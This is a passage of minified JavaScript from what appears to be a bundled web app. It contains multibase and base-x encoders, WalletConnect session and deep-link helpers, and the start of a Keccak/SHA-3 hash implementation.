            for (let D = v - 1; (O !== 0 || F < b) && D !== -1; D--,
            F++)
                O += t * T[D] >>> 0,
                T[D] = O % 256 >>> 0,
                O = O / 256 >>> 0;
            if (O !== 0)
                throw new Error("Non-zero carry");
            b = F,
            h++
        }
        let x = v - b;
        for (; x !== v && T[x] === 0; )
            x++;
        const E = new Uint8Array(p + (v - x));
        let B = p;
        for (; x !== v; )
            E[B++] = T[x++];
        return E
    }
    function l(f) {
        const h = a(f);
        if (h)
            return h;
        throw new Error("Non-base" + t + " character")
    }
    return {
        encode: s,
        decodeUnsafe: a,
        decode: l
    }
}
var nQ = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
const oQ = rQ(nQ);
function dN(r=0) {
    return globalThis.Buffer != null && globalThis.Buffer.allocUnsafe != null ? globalThis.Buffer.allocUnsafe(r) : new Uint8Array(r)
}
function Rp(r, e) {
    e || (e = r.reduce( (i, n) => i + n.length, 0));
    const t = dN(e);
    let o = 0;
    for (const i of r)
        t.set(i, o),
        o += i.length;
    return t
}
function iQ(r, e) {
    if (r.length >= 255)
        throw new TypeError("Alphabet too long");
    for (var t = new Uint8Array(256), o = 0; o < t.length; o++)
        t[o] = 255;
    for (var i = 0; i < r.length; i++) {
        var n = r.charAt(i)
          , s = n.charCodeAt(0);
        if (t[s] !== 255)
            throw new TypeError(n + " is ambiguous");
        t[s] = i
    }
    var a = r.length
      , l = r.charAt(0)
      , f = Math.log(a) / Math.log(256)
      , h = Math.log(256) / Math.log(a);
    function p(T) {
        if (T instanceof Uint8Array || (ArrayBuffer.isView(T) ? T = new Uint8Array(T.buffer,T.byteOffset,T.byteLength) : Array.isArray(T) && (T = Uint8Array.from(T))),
        !(T instanceof Uint8Array))
            throw new TypeError("Expected Uint8Array");
        if (T.length === 0)
            return "";
        for (var x = 0, E = 0, B = 0, P = T.length; B !== P && T[B] === 0; )
            B++,
            x++;
        for (var O = (P - B) * h + 1 >>> 0, F = new Uint8Array(O); B !== P; ) {
            for (var D = T[B], I = 0, M = O - 1; (D !== 0 || I < E) && M !== -1; M--,
            I++)
                D += 256 * F[M] >>> 0,
                F[M] = D % a >>> 0,
                D = D / a >>> 0;
            if (D !== 0)
                throw new Error("Non-zero carry");
            E = I,
            B++
        }
        for (var C = O - E; C !== O && F[C] === 0; )
            C++;
        for (var W = l.repeat(x); C < O; ++C)
            W += r.charAt(F[C]);
        return W
    }
    function b(T) {
        if (typeof T != "string")
            throw new TypeError("Expected String");
        if (T.length === 0)
            return new Uint8Array;
        var x = 0;
        if (T[x] !== " ") {
            for (var E = 0, B = 0; T[x] === l; )
                E++,
                x++;
            for (var P = (T.length - x) * f + 1 >>> 0, O = new Uint8Array(P); T[x]; ) {
                var F = t[T.charCodeAt(x)];
                if (F === 255)
                    return;
                for (var D = 0, I = P - 1; (F !== 0 || D < B) && I !== -1; I--,
                D++)
                    F += a * O[I] >>> 0,
                    O[I] = F % 256 >>> 0,
                    F = F / 256 >>> 0;
                if (F !== 0)
                    throw new Error("Non-zero carry");
                B = D,
                x++
            }
            if (T[x] !== " ") {
                for (var M = P - B; M !== P && O[M] === 0; )
                    M++;
                for (var C = new Uint8Array(E + (P - M)), W = E; M !== P; )
                    C[W++] = O[M++];
                return C
            }
        }
    }
    function v(T) {
        var x = b(T);
        if (x)
            return x;
        throw new Error(`Non-${e} character`)
    }
    return {
        encode: p,
        decodeUnsafe: b,
        decode: v
    }
}
var sQ = iQ
  , aQ = sQ;
const cQ = r => {
    if (r instanceof Uint8Array && r.constructor.name === "Uint8Array")
        return r;
    if (r instanceof ArrayBuffer)
        return new Uint8Array(r);
    if (ArrayBuffer.isView(r))
        return new Uint8Array(r.buffer,r.byteOffset,r.byteLength);
    throw new Error("Unknown type, must be binary type")
}
  , lQ = r => new TextEncoder().encode(r)
  , uQ = r => new TextDecoder().decode(r);
class fQ {
    constructor(e, t, o) {
        this.name = e,
        this.prefix = t,
        this.baseEncode = o
    }
    encode(e) {
        if (e instanceof Uint8Array)
            return `${this.prefix}${this.baseEncode(e)}`;
        throw Error("Unknown type, must be binary type")
    }
}
class dQ {
    constructor(e, t, o) {
        if (this.name = e,
        this.prefix = t,
        t.codePointAt(0) === void 0)
            throw new Error("Invalid prefix character");
        this.prefixCodePoint = t.codePointAt(0),
        this.baseDecode = o
    }
    decode(e) {
        if (typeof e == "string") {
            if (e.codePointAt(0) !== this.prefixCodePoint)
                throw Error(`Unable to decode multibase string ${JSON.stringify(e)}, ${this.name} decoder only supports inputs prefixed with ${this.prefix}`);
            return this.baseDecode(e.slice(this.prefix.length))
        } else
            throw Error("Can only multibase decode strings")
    }
    or(e) {
        return hN(this, e)
    }
}
class hQ {
    constructor(e) {
        this.decoders = e
    }
    or(e) {
        return hN(this, e)
    }
    decode(e) {
        const t = e[0]
          , o = this.decoders[t];
        if (o)
            return o.decode(e);
        throw RangeError(`Unable to decode multibase string ${JSON.stringify(e)}, only inputs prefixed with ${Object.keys(this.decoders)} are supported`)
    }
}
const hN = (r, e) => new hQ({
    ...r.decoders || {
        [r.prefix]: r
    },
    ...e.decoders || {
        [e.prefix]: e
    }
});
class pQ {
    constructor(e, t, o, i) {
        this.name = e,
        this.prefix = t,
        this.baseEncode = o,
        this.baseDecode = i,
        this.encoder = new fQ(e,t,o),
        this.decoder = new dQ(e,t,i)
    }
    encode(e) {
        return this.encoder.encode(e)
    }
    decode(e) {
        return this.decoder.decode(e)
    }
}
const R1 = ({name: r, prefix: e, encode: t, decode: o}) => new pQ(r,e,t,o)
  , m0 = ({prefix: r, name: e, alphabet: t}) => {
    const {encode: o, decode: i} = aQ(t, e);
    return R1({
        prefix: r,
        name: e,
        encode: o,
        decode: n => cQ(i(n))
    })
}
  , gQ = (r, e, t, o) => {
    const i = {};
    for (let h = 0; h < e.length; ++h)
        i[e[h]] = h;
    let n = r.length;
    for (; r[n - 1] === "="; )
        --n;
    const s = new Uint8Array(n * t / 8 | 0);
    let a = 0
      , l = 0
      , f = 0;
    for (let h = 0; h < n; ++h) {
        const p = i[r[h]];
        if (p === void 0)
            throw new SyntaxError(`Non-${o} character`);
        l = l << t | p,
        a += t,
        a >= 8 && (a -= 8,
        s[f++] = 255 & l >> a)
    }
    if (a >= t || 255 & l << 8 - a)
        throw new SyntaxError("Unexpected end of data");
    return s
}
  , yQ = (r, e, t) => {
    const o = e[e.length - 1] === "="
      , i = (1 << t) - 1;
    let n = ""
      , s = 0
      , a = 0;
    for (let l = 0; l < r.length; ++l)
        for (a = a << 8 | r[l],
        s += 8; s > t; )
            s -= t,
            n += e[i & a >> s];
    if (s && (n += e[i & a << t - s]),
    o)
        for (; n.length * t & 7; )
            n += "=";
    return n
}
  , Vn = ({name: r, prefix: e, bitsPerChar: t, alphabet: o}) => R1({
    prefix: e,
    name: r,
    encode(i) {
        return yQ(i, o, t)
    },
    decode(i) {
        return gQ(i, o, t, r)
    }
})
  , bQ = R1({
    prefix: "\0",
    name: "identity",
    encode: r => uQ(r),
    decode: r => lQ(r)
})
  , mQ = Object.freeze(Object.defineProperty({
    __proto__: null,
    identity: bQ
}, Symbol.toStringTag, {
    value: "Module"
}))
  , xQ = Vn({
    prefix: "0",
    name: "base2",
    alphabet: "01",
    bitsPerChar: 1
})
  , wQ = Object.freeze(Object.defineProperty({
    __proto__: null,
    base2: xQ
}, Symbol.toStringTag, {
    value: "Module"
}))
  , vQ = Vn({
    prefix: "7",
    name: "base8",
    alphabet: "01234567",
    bitsPerChar: 3
})
  , TQ = Object.freeze(Object.defineProperty({
    __proto__: null,
    base8: vQ
}, Symbol.toStringTag, {
    value: "Module"
}))
  , EQ = m0({
    prefix: "9",
    name: "base10",
    alphabet: "0123456789"
})
  , AQ = Object.freeze(Object.defineProperty({
    __proto__: null,
    base10: EQ
}, Symbol.toStringTag, {
    value: "Module"
}))
  , PQ = Vn({
    prefix: "f",
    name: "base16",
    alphabet: "0123456789abcdef",
    bitsPerChar: 4
})
  , CQ = Vn({
    prefix: "F",
    name: "base16upper",
    alphabet: "0123456789ABCDEF",
    bitsPerChar: 4
})
  , SQ = Object.freeze(Object.defineProperty({
    __proto__: null,
    base16: PQ,
    base16upper: CQ
}, Symbol.toStringTag, {
    value: "Module"
}))
  , BQ = Vn({
    prefix: "b",
    name: "base32",
    alphabet: "abcdefghijklmnopqrstuvwxyz234567",
    bitsPerChar: 5
})
  , _Q = Vn({
    prefix: "B",
    name: "base32upper",
    alphabet: "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567",
    bitsPerChar: 5
})
  , IQ = Vn({
    prefix: "c",
    name: "base32pad",
    alphabet: "abcdefghijklmnopqrstuvwxyz234567=",
    bitsPerChar: 5
})
  , OQ = Vn({
    prefix: "C",
    name: "base32padupper",
    alphabet: "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567=",
    bitsPerChar: 5
})
  , RQ = Vn({
    prefix: "v",
    name: "base32hex",
    alphabet: "0123456789abcdefghijklmnopqrstuv",
    bitsPerChar: 5
})
  , WQ = Vn({
    prefix: "V",
    name: "base32hexupper",
    alphabet: "0123456789ABCDEFGHIJKLMNOPQRSTUV",
    bitsPerChar: 5
})
  , MQ = Vn({
    prefix: "t",
    name: "base32hexpad",
    alphabet: "0123456789abcdefghijklmnopqrstuv=",
    bitsPerChar: 5
})
  , NQ = Vn({
    prefix: "T",
    name: "base32hexpadupper",
    alphabet: "0123456789ABCDEFGHIJKLMNOPQRSTUV=",
    bitsPerChar: 5
})
  , DQ = Vn({
    prefix: "h",
    name: "base32z",
    alphabet: "ybndrfg8ejkmcpqxot1uwisza345h769",
    bitsPerChar: 5
})
  , FQ = Object.freeze(Object.defineProperty({
    __proto__: null,
    base32: BQ,
    base32hex: RQ,
    base32hexpad: MQ,
    base32hexpadupper: NQ,
    base32hexupper: WQ,
    base32pad: IQ,
    base32padupper: OQ,
    base32upper: _Q,
    base32z: DQ
}, Symbol.toStringTag, {
    value: "Module"
}))
  , UQ = m0({
    prefix: "k",
    name: "base36",
    alphabet: "0123456789abcdefghijklmnopqrstuvwxyz"
})
  , kQ = m0({
    prefix: "K",
    name: "base36upper",
    alphabet: "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
})
  , LQ = Object.freeze(Object.defineProperty({
    __proto__: null,
    base36: UQ,
    base36upper: kQ
}, Symbol.toStringTag, {
    value: "Module"
}))
  , $Q = m0({
    name: "base58btc",
    prefix: "z",
    alphabet: "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
})
  , zQ = m0({
    name: "base58flickr",
    prefix: "Z",
    alphabet: "123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ"
})
  , jQ = Object.freeze(Object.defineProperty({
    __proto__: null,
    base58btc: $Q,
    base58flickr: zQ
}, Symbol.toStringTag, {
    value: "Module"
}))
  , qQ = Vn({
    prefix: "m",
    name: "base64",
    alphabet: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",
    bitsPerChar: 6
})
  , VQ = Vn({
    prefix: "M",
    name: "base64pad",
    alphabet: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",
    bitsPerChar: 6
})
  , HQ = Vn({
    prefix: "u",
    name: "base64url",
    alphabet: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_",
    bitsPerChar: 6
})
  , GQ = Vn({
    prefix: "U",
    name: "base64urlpad",
    alphabet: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_=",
    bitsPerChar: 6
})
  , KQ = Object.freeze(Object.defineProperty({
    __proto__: null,
    base64: qQ,
    base64pad: VQ,
    base64url: HQ,
    base64urlpad: GQ
}, Symbol.toStringTag, {
    value: "Module"
}))
  , pN = Array.from("")
  , ZQ = pN.reduce( (r, e, t) => (r[t] = e,
r), [])
  , YQ = pN.reduce( (r, e, t) => (r[e.codePointAt(0)] = t,
r), []);
function XQ(r) {
    return r.reduce( (e, t) => (e += ZQ[t],
    e), "")
}
function JQ(r) {
    const e = [];
    for (const t of r) {
        const o = YQ[t.codePointAt(0)];
        if (o === void 0)
            throw new Error(`Non-base256emoji character: ${t}`);
        e.push(o)
    }
    return new Uint8Array(e)
}
const QQ = R1({
    prefix: "",
    name: "base256emoji",
    encode: XQ,
    decode: JQ
})
  , eee = Object.freeze(Object.defineProperty({
    __proto__: null,
    base256emoji: QQ
}, Symbol.toStringTag, {
    value: "Module"
}));
new TextEncoder;
new TextDecoder;
const AB = {
    ...mQ,
    ...wQ,
    ...TQ,
    ...AQ,
    ...SQ,
    ...FQ,
    ...LQ,
    ...jQ,
    ...KQ,
    ...eee
};
function gN(r, e, t, o) {
    return {
        name: r,
        prefix: e,
        encoder: {
            name: r,
            prefix: e,
            encode: t
        },
        decoder: {
            decode: o
        }
    }
}
const PB = gN("utf8", "u", r => "u" + new TextDecoder("utf8").decode(r), r => new TextEncoder().encode(r.substring(1)))
  , l2 = gN("ascii", "a", r => {
    let e = "a";
    for (let t = 0; t < r.length; t++)
        e += String.fromCharCode(r[t]);
    return e
}
, r => {
    r = r.substring(1);
    const e = dN(r.length);
    for (let t = 0; t < r.length; t++)
        e[t] = r.charCodeAt(t);
    return e
}
)
  , yN = {
    utf8: PB,
    "utf-8": PB,
    hex: AB.base16,
    latin1: l2,
    ascii: l2,
    binary: l2,
    ...AB
};
function ki(r, e="utf8") {
    const t = yN[e];
    if (!t)
        throw new Error(`Unsupported encoding "${e}"`);
    return (e === "utf8" || e === "utf-8") && globalThis.Buffer != null && globalThis.Buffer.from != null ? globalThis.Buffer.from(r, "utf8") : t.decoder.decode(`${t.prefix}${r}`)
}
function Do(r, e="utf8") {
    const t = yN[e];
    if (!t)
        throw new Error(`Unsupported encoding "${e}"`);
    return (e === "utf8" || e === "utf-8") && globalThis.Buffer != null && globalThis.Buffer.from != null ? globalThis.Buffer.from(r.buffer, r.byteOffset, r.byteLength).toString("utf8") : t.encoder.encode(r).substring(1)
}
const tee = {
    waku: {
        publish: "waku_publish",
        batchPublish: "waku_batchPublish",
        subscribe: "waku_subscribe",
        batchSubscribe: "waku_batchSubscribe",
        subscription: "waku_subscription",
        unsubscribe: "waku_unsubscribe",
        batchUnsubscribe: "waku_batchUnsubscribe",
        batchFetchMessages: "waku_batchFetchMessages"
    },
    irn: {
        publish: "irn_publish",
        batchPublish: "irn_batchPublish",
        subscribe: "irn_subscribe",
        batchSubscribe: "irn_batchSubscribe",
        subscription: "irn_subscription",
        unsubscribe: "irn_unsubscribe",
        batchUnsubscribe: "irn_batchUnsubscribe",
        batchFetchMessages: "irn_batchFetchMessages"
    },
    iridium: {
        publish: "iridium_publish",
        batchPublish: "iridium_batchPublish",
        subscribe: "iridium_subscribe",
        batchSubscribe: "iridium_batchSubscribe",
        subscription: "iridium_subscription",
        unsubscribe: "iridium_unsubscribe",
        batchUnsubscribe: "iridium_batchUnsubscribe",
        batchFetchMessages: "iridium_batchFetchMessages"
    }
};
var ree = {};
const nee = ":";
function vm(r) {
    const [e,t] = r.split(nee);
    return {
        namespace: e,
        reference: t
    }
}
function bN(r, e) {
    return r.includes(":") ? [r] : e.chains || []
}
var oee = Object.defineProperty
  , iee = Object.defineProperties
  , see = Object.getOwnPropertyDescriptors
  , CB = Object.getOwnPropertySymbols
  , aee = Object.prototype.hasOwnProperty
  , cee = Object.prototype.propertyIsEnumerable
  , SB = (r, e, t) => e in r ? oee(r, e, {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: t
}) : r[e] = t
  , BB = (r, e) => {
    for (var t in e || (e = {}))
        aee.call(e, t) && SB(r, t, e[t]);
    if (CB)
        for (var t of CB(e))
            cee.call(e, t) && SB(r, t, e[t]);
    return r
}
  , lee = (r, e) => iee(r, see(e));
const uee = "ReactNative"
  , ci = {
    reactNative: "react-native",
    node: "node",
    browser: "browser",
    unknown: "unknown"
}
  , fee = "js";
function n1() {
    return typeof process < "u" && typeof process.versions < "u" && typeof process.versions.node < "u"
}
function Qc() {
    return !Ha.getDocument() && !!Ha.getNavigator() && navigator.product === uee
}
function dee() {
    return Qc() && typeof global < "u" && typeof (global == null ? void 0 : global.Platform) < "u" && (global == null ? void 0 : global.Platform.OS) === "android"
}
function hee() {
    return Qc() && typeof global < "u" && typeof (global == null ? void 0 : global.Platform) < "u" && (global == null ? void 0 : global.Platform.OS) === "ios"
}
function Yd() {
    return !n1() && !!Ha.getNavigator() && !!Ha.getDocument()
}
function x0() {
    return Qc() ? ci.reactNative : n1() ? ci.node : Yd() ? ci.browser : ci.unknown
}
function _B() {
    var r;
    try {
        return Qc() && typeof global < "u" && typeof (global == null ? void 0 : global.Application) < "u" ? (r = global.Application) == null ? void 0 : r.applicationId : void 0
    } catch {
        return
    }
}
function pee(r, e) {
    const t = new URLSearchParams(r);
    for (const o of Object.keys(e).sort())
        if (e.hasOwnProperty(o)) {
            const i = e[o];
            i !== void 0 && t.set(o, i)
        }
    return t.toString()
}
function gee(r) {
    var e, t;
    const o = mN();
    try {
        return r != null && r.url && o.url && new URL(r.url).host !== new URL(o.url).host && (console.warn(`The configured WalletConnect 'metadata.url':${r.url} differs from the actual page url:${o.url}. This is probably unintended and can lead to issues.`),
        r.url = o.url),
        (e = r == null ? void 0 : r.icons) != null && e.length && r.icons.length > 0 && (r.icons = r.icons.filter(i => i !== "")),
        lee(BB(BB({}, o), r), {
            url: (r == null ? void 0 : r.url) || o.url,
            name: (r == null ? void 0 : r.name) || o.name,
            description: (r == null ? void 0 : r.description) || o.description,
            icons: (t = r == null ? void 0 : r.icons) != null && t.length && r.icons.length > 0 ? r.icons : o.icons
        })
    } catch (i) {
        return console.warn("Error populating app metadata", i),
        r || o
    }
}
function mN() {
    return hJ.getWindowMetadata() || {
        name: "",
        description: "",
        url: "",
        icons: [""]
    }
}
function yee() {
    if (x0() === ci.reactNative && typeof global < "u" && typeof (global == null ? void 0 : global.Platform) < "u") {
        const {OS: t, Version: o} = global.Platform;
        return [t, o].join("-")
    }
    const r = sJ();
    if (r === null)
        return "unknown";
    const e = r.os ? r.os.replace(" ", "").toLowerCase() : "unknown";
    return r.type === "browser" ? [e, r.name, r.version].join("-") : [e, r.version].join("-")
}
function bee() {
    var r;
    const e = x0();
    return e === ci.browser ? [e, ((r = Ha.getLocation()) == null ? void 0 : r.host) || "unknown"].join(":") : e
}
function xN(r, e, t) {
    const o = yee()
      , i = bee();
    return [[r, e].join("-"), [fee, t].join("-"), o, i].join("/")
}
function mee({protocol: r, version: e, relayUrl: t, sdkVersion: o, auth: i, projectId: n, useOnCloseEvent: s, bundleId: a, packageName: l}) {
    const f = t.split("?")
      , h = xN(r, e, o)
      , p = {
        auth: i,
        ua: h,
        projectId: n,
        useOnCloseEvent: s,
        packageName: l || void 0,
        bundleId: a || void 0
    }
      , b = pee(f[1] || "", p);
    return f[0] + "?" + b
}
function $l(r, e) {
    return r.filter(t => e.includes(t)).length === r.length
}
function UE(r) {
    return Object.fromEntries(r.entries())
}
function kE(r) {
    return new Map(Object.entries(r))
}
function Il(r=Ze.FIVE_MINUTES, e) {
    const t = Ze.toMiliseconds(r || Ze.FIVE_MINUTES);
    let o, i, n, s;
    return {
        resolve: a => {
            n && o && (clearTimeout(n),
            o(a),
            s = Promise.resolve(a))
        }
        ,
        reject: a => {
            n && i && (clearTimeout(n),
            i(a))
        }
        ,
        done: () => new Promise( (a, l) => {
            if (s)
                return a(s);
            n = setTimeout( () => {
                const f = new Error(e);
                s = Promise.reject(f),
                l(f)
            }
            , t),
            o = a,
            i = l
        }
        )
    }
}
function $c(r, e, t) {
    return new Promise(async (o, i) => {
        const n = setTimeout( () => i(new Error(t)), e);
        try {
            const s = await r;
            o(s)
        } catch (s) {
            i(s)
        }
        clearTimeout(n)
    }
    )
}
function wN(r, e) {
    if (typeof e == "string" && e.startsWith(`${r}:`))
        return e;
    if (r.toLowerCase() === "topic") {
        if (typeof e != "string")
            throw new Error('Value must be "string" for expirer target type: topic');
        return `topic:${e}`
    } else if (r.toLowerCase() === "id") {
        if (typeof e != "number")
            throw new Error('Value must be "number" for expirer target type: id');
        return `id:${e}`
    }
    throw new Error(`Unknown expirer target type: ${r}`)
}
function xee(r) {
    return wN("topic", r)
}
function wee(r) {
    return wN("id", r)
}
function vN(r) {
    const [e,t] = r.split(":")
      , o = {
        id: void 0,
        topic: void 0
    };
    if (e === "topic" && typeof t == "string")
        o.topic = t;
    else if (e === "id" && Number.isInteger(Number(t)))
        o.id = Number(t);
    else
        throw new Error(`Invalid target, expected id:number or topic:string, got ${e}:${t}`);
    return o
}
function yn(r, e) {
    return Ze.fromMiliseconds(Date.now() + Ze.toMiliseconds(r))
}
function Wc(r) {
    return Date.now() >= Ze.toMiliseconds(r)
}
function wr(r, e) {
    return `${r}${e ? `:${e}` : ""}`
}
function tu(r=[], e=[]) {
    return [...new Set([...r, ...e])]
}
async function vee({id: r, topic: e, wcDeepLink: t}) {
    var o;
    try {
        if (!t)
            return;
        const i = typeof t == "string" ? JSON.parse(t) : t
          , n = i == null ? void 0 : i.href;
        if (typeof n != "string")
            return;
        const s = Tee(n, r, e)
          , a = x0();
        if (a === ci.browser) {
            if (!((o = Ha.getDocument()) != null && o.hasFocus())) {
                console.warn("Document does not have focus, skipping deeplink.");
                return
            }
            Eee(s)
        } else
            a === ci.reactNative && typeof (global == null ? void 0 : global.Linking) < "u" && await global.Linking.openURL(s)
    } catch (i) {
        console.error(i)
    }
}
function Tee(r, e, t) {
    const o = `requestId=${e}&sessionTopic=${t}`;
    r.endsWith("/") && (r = r.slice(0, -1));
    let i = `${r}`;
    if (r.startsWith("https://t.me")) {
        const n = r.includes("?") ? "&startapp=" : "?startapp=";
        i = `${i}${n}${See(o, !0)}`
    } else
        i = `${i}/wc?${o}`;
    return i
}
function Eee(r) {
    let e = "_self";
    Cee() ? e = "_top" : (Pee() || r.startsWith("https://") || r.startsWith("http://")) && (e = "_blank"),
    window.open(r, e, "noreferrer noopener")
}
async function Aee(r, e) {
    let t = "";
    try {
        if (Yd() && (t = localStorage.getItem(e),
        t))
            return t;
        t = await r.getItem(e)
    } catch (o) {
        console.error(o)
    }
    return t
}
function IB(r, e) {
    if (!r.includes(e))
        return null;
    const t = r.split(/([&,?,=])/)
      , o = t.indexOf(e);
    return t[o + 2]
}
function OB() {
    return typeof crypto < "u" && crypto != null && crypto.randomUUID ? crypto.randomUUID() : "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/gu, r => {
        const e = Math.random() * 16 | 0;
        return (r === "x" ? e : e & 3 | 8).toString(16)
    }
    )
}
function C3() {
    return typeof process < "u" && ree.IS_VITEST === "true"
}
function Pee() {
    return typeof window < "u" && (!!window.TelegramWebviewProxy || !!window.Telegram || !!window.TelegramWebviewProxyProto)
}
function Cee() {
    try {
        return window.self !== window.top
    } catch {
        return !1
    }
}
function See(r, e=!1) {
    const t = Buffer.from(r).toString("base64");
    return e ? t.replace(/[=]/g, "") : t
}
function TN(r) {
    return Buffer.from(r, "base64").toString("utf-8")
}
function Bee(r) {
    return new Promise(e => setTimeout(e, r))
}
function qp(r) {
    if (!Number.isSafeInteger(r) || r < 0)
        throw new Error("positive integer expected, got " + r)
}
function _ee(r) {
    return r instanceof Uint8Array || ArrayBuffer.isView(r) && r.constructor.name === "Uint8Array"
}
function w0(r, ...e) {
    if (!_ee(r))
        throw new Error("Uint8Array expected");
    if (e.length > 0 && !e.includes(r.length))
        throw new Error("Uint8Array expected of length " + e + ", got length=" + r.length)
}
function S3(r) {
    if (typeof r != "function" || typeof r.create != "function")
        throw new Error("Hash should be wrapped by utils.wrapConstructor");
    qp(r.outputLen),
    qp(r.blockLen)
}
function Ad(r, e=!0) {
    if (r.destroyed)
        throw new Error("Hash instance has been destroyed");
    if (e && r.finished)
        throw new Error("Hash#digest() has already been called")
}
function EN(r, e) {
    w0(r);
    const t = e.outputLen;
    if (r.length < t)
        throw new Error("digestInto() expects output buffer of length at least " + t)
}
const uy = BigInt(2 ** 32 - 1)
  , RB = BigInt(32);
function Iee(r, e=!1) {
    return e ? {
        h: Number(r & uy),
        l: Number(r >> RB & uy)
    } : {
        h: Number(r >> RB & uy) | 0,
        l: Number(r & uy) | 0
    }
}
function Oee(r, e=!1) {
    let t = new Uint32Array(r.length)
      , o = new Uint32Array(r.length);
    for (let i = 0; i < r.length; i++) {
        const {h: n, l: s} = Iee(r[i], e);
        [t[i],o[i]] = [n, s]
    }
    return [t, o]
}
const Ree = (r, e, t) => r << t | e >>> 32 - t
  , Wee = (r, e, t) => e << t | r >>> 32 - t
  , Mee = (r, e, t) => e << t - 32 | r >>> 64 - t
  , Nee = (r, e, t) => r << t - 32 | e >>> 64 - t
  , mf = typeof globalThis == "object" && "crypto"in globalThis ? globalThis.crypto : void 0;
function Dee(r) {
    return new Uint32Array(r.buffer,r.byteOffset,Math.floor(r.byteLength / 4))
}
function u2(r) {
    return new DataView(r.buffer,r.byteOffset,r.byteLength)
}
function Ss(r, e) {
    return r << 32 - e | r >>> e
}
const WB = new Uint8Array(new Uint32Array([287454020]).buffer)[0] === 68;
function Fee(r) {
    return r << 24 & 4278190080 | r << 8 & 16711680 | r >>> 8 & 65280 | r >>> 24 & 255
}
function MB(r) {
    for (let e = 0; e < r.length; e++)
        r[e] = Fee(r[e])
}
function Uee(r) {
    if (typeof r != "string")
        throw new Error("utf8ToBytes expected string, got " + typeof r);
    return new Uint8Array(new TextEncoder().encode(r))
}
function Pd(r) {
    return typeof r == "string" && (r = Uee(r)),
    w0(r),
    r
}
function kee(...r) {
    let e = 0;
    for (let o = 0; o < r.length; o++) {
        const i = r[o];
        w0(i),
        e += i.length
    }
    const t = new Uint8Array(e);
    for (let o = 0, i = 0; o < r.length; o++) {
        const n = r[o];
        t.set(n, i),
        i += n.length
    }
    return t
}
let B3 = class {
    clone() {
        return this._cloneInto()
    }
}
;
function AN(r) {
    const e = o => r().update(Pd(o)).digest()
      , t = r();
    return e.outputLen = t.outputLen,
    e.blockLen = t.blockLen,
    e.create = () => r(),
    e
}
function Xd(r=32) {
    if (mf && typeof mf.getRandomValues == "function")
        return mf.getRandomValues(new Uint8Array(r));
    if (mf && typeof mf.randomBytes == "function")
        return mf.randomBytes(r);
    throw new Error("crypto.getRandomValues must be defined")
}
const PN = []
  , CN = []
  , SN = []
  , Lee = BigInt(0)
  , pp = BigInt(1)
  , $ee = BigInt(2)
  , zee = BigInt(7)
  , jee = BigInt(256)
  , qee = BigInt(113);
for (let r = 0, e = pp, t = 1, o = 0; r < 24; r++) {
    [t,o] = [o, (2 * t + 3 * o) % 5],
    PN.push(2 * (5 * o + t)),
    CN.push((r + 1) * (r + 2) / 2 % 64);
    let i = Lee;
    for (let n = 0; n < 7; n++)
        e = (e << pp ^ (e >> zee) * qee) % jee,
        e & $ee && (i ^= pp << (pp << BigInt(n)) - pp);
    SN.push(i)
}
const [Vee,Hee] = Oee(SN, !0)
  , NB = (r, e, t) => t > 32 ? Mee(r, e, t) : Ree(r, e, t)
  , DB = (r, e, t) => t > 32 ? Nee(r, e, t) : Wee(r, e, t);
function Gee(r, e=24) {
    const t = new Uint32Array(10);
    for (let o = 24 - e; o < 24; o++) {
        for (let s = 0; s < 10; s++)
            t[s] = r[s] ^ r[s + 10] ^ r[s + 20] ^ r[s + 30] ^ r[s + 40];
        for (let s = 0; s < 10; s += 2) {
            const a = (s + 8) % 10
              , l = (s + 2) % 10
              , f = t[l]
              , h = t[l + 1]
              , p = NB(f, h, 1) ^ t[a]
              , b = DB(f, h, 1) ^ t[a + 1];
            for (let v = 0; v < 50; v += 10)
                r[s + v] ^= p,
                r[s + v + 1] ^= b
        }
        let i = r[2]
          , n = r[3];
        for (let s = 0; s < 24; s++) {
            const a = CN[s]
              , l = NB(i, n, a)
              , f = DB(i, n, a)
              , h = PN[s];
            i = r[h],
            n = r[h + 1],
            r[h] = l,
            r[h + 1] = f
        }
        for (let s = 0; s < 50; s += 10) {
            for (let a = 0; a < 10; a++)
                t[a] = r[s + a];
            for (let a = 0; a < 10; a++)
                r[s + a] ^= ~t[(a + 2) % 10] & t[(a + 4) % 10]
        }
        r[0] ^= Vee[o],
        r[1] ^= Hee[o]
    }
    t.fill(0)
}
let Kee = class BN extends B3 {
    constructor(e, t, o, i=!1, n=24) {
        if (super(),
        this.blockLen = e,
        this.suffix = t,
        this.outputLen = o,
        this.enableXOF = i,
        this.rounds = n,
        this.pos = 0,
        this.posOut = 0,
        this.finished = !1,
        this.destroyed = !1,
        qp(o),
        0 >= this.blockLen || this.blockLen >= 200)
            throw new Error("Sha3 supports only keccak-f1600 function");
        this.state = new Uint8Array(200),
        this.state32 = Dee(this.state)
    }
    keccak() {
        WB || MB(this.state32),
        Gee(this.state32, this.rounds),
        WB || MB(this.state32),
        this.posOut = 0,
        this.pos = 0
    }
    update(e) {
        Ad(this);
        const {blockLen: t, state: o} = this;
        e = Pd(e);
        const i = e.length;
        for (let n = 0; n < i; ) {
            const s = Math.min(t - this.pos, i - n);
            for (let a = 0; a < s; a++)
                o[this.pos++] ^= e[n++];
            this.pos === t && this.keccak()
        }
        return this
    }
    finish() {
        if (this.finished)
            return;
        this.finished = !0;
        const {state: e, suffix: t, pos: o, blockLen: i} = this;
        e[o] ^= t,
        (t & 128) !== 0 && o === i - 1 && this.keccak(),
        e[i - 1] ^= 128,
        this.keccak()
    }
    writeInto(e) {
        Ad(this, !1),
        w0(e),
        this.finish();
        const t = this.state
          , {blockLen: o} = this;
        for (let i = 0, n = e.length; i < n; ) {
